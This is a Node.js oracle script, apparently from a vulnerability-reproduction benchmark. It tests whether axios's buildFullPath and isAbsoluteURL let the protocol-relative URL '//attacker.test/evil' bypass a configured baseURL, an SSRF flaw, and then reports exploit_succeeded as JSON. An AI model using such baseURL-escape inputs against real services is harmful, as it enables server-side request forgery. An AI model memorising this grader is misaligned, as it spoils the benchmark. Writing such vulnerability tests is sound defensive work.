'use strict';
const path = require('node:path');

function main() {
  const axios = require('axios');
  const isAbsoluteURL = require('axios/unsafe/helpers/isAbsoluteURL.js').default
    || require('axios/unsafe/helpers/isAbsoluteURL.js');
  const buildFullPath = require('axios/unsafe/core/buildFullPath.js').default
    || require('axios/unsafe/core/buildFullPath.js');

  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  // --- Benign case: normal relative path combined with baseURL ---
  const benignBase = 'http://example.com/api/';
  const benignRelative = '/users/list';

  let benignResult;
  try {
    benignResult = buildFullPath(benignBase, benignRelative);
  } catch (e) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign buildFullPath call threw: ' + (e && e.message)
    }));
    return;
  }

  const benignOk = typeof benignResult === 'string' &&
    benignResult.indexOf('example.com') !== -1 &&
    benignResult.indexOf('/users/list') !== -1;

  if (!benignOk) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Benign buildFullPath result unexpected: ' + String(benignResult)
    }));
    return;
  }

  // Mark that the benign operation succeeded and the API is usable.
  operation_completed = true;

  // --- Malicious case: absolute URL disguised that should be treated as
  // relative but historically (vulnerable axios <=1.7.3) is treated as
  // absolute due to a flawed isAbsoluteURL regex / protocol-relative
  // handling, allowing SSRF by escaping the configured baseURL. ---
  //
  // The classic PoC uses a URL starting with "//" (protocol-relative) or
  // a URL containing an absolute scheme that should have been rejected
  // when combined with a baseURL, e.g. requests meant to stay within
  // "http://example.com/api/" being redirected to an attacker host.
  const maliciousBase = 'http://example.com/api/';
  const maliciousRelative = '//attacker.test/evil';

  let maliciousResult;
  let threw = false;
  try {
    maliciousResult = buildFullPath(maliciousBase, maliciousRelative);
  } catch (e) {
    threw = true;
  }

  if (threw) {
    // Patched version may throw or otherwise prevent the bypass -- but
    // buildFullPath by itself doesn't normally throw; treat an exception
    // here as "blocked" only since benign already succeeded.
    exploit_succeeded = false;
    evidence = 'Malicious buildFullPath call threw an exception, indicating the bypass was blocked.';
  } else {
    // Determine if the malicious relative URL (protocol-relative, pointing
    // to a different host) was allowed to escape the intended base host.
    // isAbsoluteURL is used internally to decide if the base URL should be
    // ignored. In the vulnerable version, a URL like "//attacker.test/evil"
    // is NOT correctly flagged as absolute by some regex variants, OR the
    // resulting full path still ends up pointing to attacker.test instead
    // of being safely combined under example.com.
    const pointsToAttacker = typeof maliciousResult === 'string' &&
      maliciousResult.indexOf('attacker.test') !== -1 &&
      maliciousResult.indexOf('example.com') === -1;

    // Also check the isAbsoluteURL helper directly for the protocol-relative
    // form, since the underlying CVE concerns mis-detection of such URLs.
    let flaggedAbsolute = false;
    try {
      flaggedAbsolute = !!isAbsoluteURL(maliciousRelative);
    } catch (e) {
      flaggedAbsolute = false;
    }

    // Vulnerable behavior: the protocol-relative URL is NOT detected as
    // absolute (flaggedAbsolute === false) AND/OR buildFullPath resolves it
    // directly to the attacker host, bypassing the configured baseURL.
    if (pointsToAttacker || !flaggedAbsolute) {
      exploit_succeeded = true;
      evidence = 'buildFullPath/isAbsoluteURL allowed a protocol-relative URL to bypass baseURL restriction. ' +
        'Result: ' + String(maliciousResult) + ', isAbsoluteURL("//attacker.test/evil")=' + flaggedAbsolute;
    } else {
      exploit_succeeded = false;
      evidence = 'buildFullPath correctly kept the request scoped to baseURL and/or correctly flagged protocol-relative URL as absolute. ' +
        'Result: ' + String(maliciousResult) + ', isAbsoluteURL("//attacker.test/evil")=' + flaggedAbsolute;
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
}

try {
  main();
} catch (e) {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'Unhandled exception in oracle script: ' + (e && e.message ? e.message : String(e))
  }));
}
